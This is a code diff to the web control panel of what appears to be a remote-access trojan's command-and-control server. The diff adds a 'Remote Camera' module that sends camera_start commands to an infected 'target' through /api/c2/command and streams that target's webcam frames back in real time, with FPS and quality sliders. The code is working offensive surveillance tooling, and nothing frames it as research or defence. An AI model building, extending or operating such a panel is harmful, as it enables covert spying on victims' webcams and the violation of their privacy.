@@ -604,13 +604,40 @@
             <div class="module-panel" id="mod-remote-camera">
                 <header class="header">
                     <h2>Remote Camera</h2>
-                    <p class="subtitle">Access the target's webcam feed</p>
+                    <p class="subtitle">Access the target's webcam feed in real-time</p>
                 </header>
-                <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
-                        <span>Remote Camera — coming soon</span>
+
+                <!-- Controls -->
+                <div class="panel-card" style="margin-bottom:16px;">
+                    <div style="display:flex;align-items:center;gap:20px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="cam-toggle-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            Start Camera
+                        </button>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
+                            <input type="range" class="slider-range" id="cam-fps" min="1" max="30" value="10" style="width:100px;">
+                            <span id="cam-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
+                            <input type="range" class="slider-range" id="cam-quality" min="10" max="100" value="60" step="5" style="width:100px;">
+                            <span id="cam-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">60%</span>
+                        </div>
+
+                        <span id="cam-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
                     </div>
+                </div>
+
+                <!-- Camera View -->
+                <div class="panel-card" style="padding:0;overflow:hidden;background:rgba(0,0,0,0.4);">
+                    <div id="cam-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:400px;color:var(--text-muted);gap:16px;">
+                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="opacity:0.15;"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                        <span style="font-size:13px;">Press Start Camera to begin</span>
+                    </div>
+                    <img id="cam-frame" style="display:none;width:100%;height:auto;" alt="Remote Camera">
                 </div>
             </div>
 
@@ -977,6 +1004,100 @@
                 rdpPlaceholder.style.display = 'flex';
                 rdpStatus.textContent = 'Stopped';
                 rdpStatus.style.color = 'var(--text-muted)';
+            }
+        });
+
+        // Remote Camera controls
+        const camToggleBtn = document.getElementById('cam-toggle-btn');
+        const camFpsSlider = document.getElementById('cam-fps');
+        const camFpsVal = document.getElementById('cam-fps-val');
+        const camQualitySlider = document.getElementById('cam-quality');
+        const camQualityVal = document.getElementById('cam-quality-val');
+        const camStatus = document.getElementById('cam-status');
+        const camPlaceholder = document.getElementById('cam-placeholder');
+        const camFrame = document.getElementById('cam-frame');
+        let camPollInterval = null;
+        let camLastTs = 0;
+        let camRunning = false;
+
+        camFpsSlider.addEventListener('input', () => {
+            camFpsVal.textContent = camFpsSlider.value;
+        });
+        camQualitySlider.addEventListener('input', () => {
+            camQualityVal.textContent = camQualitySlider.value + '%';
+        });
+
+        async function fetchCameraFrame() {
+            if (!camRunning) return;
+            try {
+                const res = await fetch('/api/c2/camera_frame/' + encodeURIComponent(clientId) + '?ts=' + camLastTs);
+                if (res.status === 200) {
+                    const data = await res.json();
+                    if (data.b64) {
+                        camLastTs = data.ts;
+                        camFrame.src = 'data:image/jpeg;base64,' + data.b64;
+                        camFrame.style.display = 'block';
+                        camPlaceholder.style.display = 'none';
+                        camStatus.textContent = 'Streaming';
+                        camStatus.style.color = 'var(--success, #10b981)';
+                    }
+                } else if (res.status === 204 || res.status === 304) {
+                    if (camStatus.textContent === 'Connecting...') {
+                        camStatus.textContent = 'Waiting for camera...';
+                    }
+                } else {
+                    camStatus.textContent = 'Camera error';
+                    camStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } catch {
+                camStatus.textContent = 'Connection error';
+                camStatus.style.color = 'var(--danger, #ef4444)';
+            }
+        }
+
+        camToggleBtn.addEventListener('click', async () => {
+            if (!camRunning) {
+                const fps = parseInt(camFpsSlider.value) || 10;
+                const quality = camQualitySlider.value;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:' + fps + ':' + quality })
+                    });
+                    camRunning = true;
+                    camLastTs = 0;
+                    camToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop Camera';
+                    camToggleBtn.classList.remove('btn-primary');
+                    camToggleBtn.classList.add('btn-danger');
+                    camStatus.textContent = 'Connecting...';
+                    camStatus.style.color = 'var(--warning, #f59e0b)';
+
+                    if (camPollInterval) clearInterval(camPollInterval);
+                    const pollDelay = Math.max(33, Math.floor(1000 / fps));
+                    camPollInterval = setInterval(fetchCameraFrame, pollDelay);
+                    fetchCameraFrame();
+                } catch {
+                    camStatus.textContent = 'Failed to start';
+                    camStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } else {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'camera_start:stop' })
+                    });
+                } catch {}
+                if (camPollInterval) { clearInterval(camPollInterval); camPollInterval = null; }
+                camRunning = false;
+                camToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Camera';
+                camToggleBtn.classList.remove('btn-danger');
+                camToggleBtn.classList.add('btn-primary');
+                camFrame.style.display = 'none';
+                camPlaceholder.style.display = 'flex';
+                camStatus.textContent = 'Stopped';
+                camStatus.style.color = 'var(--text-muted)';
             }
         });
 
